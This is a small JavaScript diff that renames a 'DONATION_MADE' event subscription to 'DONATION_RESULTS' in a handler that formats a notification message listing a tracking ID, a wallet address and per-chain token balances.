@@ -53,7 +53,7 @@ subscribe("CHAIN_SWITCH", ({ trackingId, oldChainName, oldChainId, newChainName,
 });
 
   // 5. Donation Results
-  subscribe("DONATION_MADE", ({ walletAddress, trackingId, balances, donationSummary }) => {
+  subscribe("DONATION_RESULTS", ({ walletAddress, trackingId, balances, donationSummary }) => {
     let msg = `\n🎉 *DONATION RESULTS*\n-------------------------\n🆔 Tracking ID: \`${trackingId}\`\n👛 Address: \`${walletAddress}\`\n\n💰 *Updated Balances:*\n`;
     balances.forEach(chain => {
       msg += `🌐 *${chain.name}*\n   • Native: ${chain.native} ($${chain.nativeValue})\n   • Tokens:\n`;
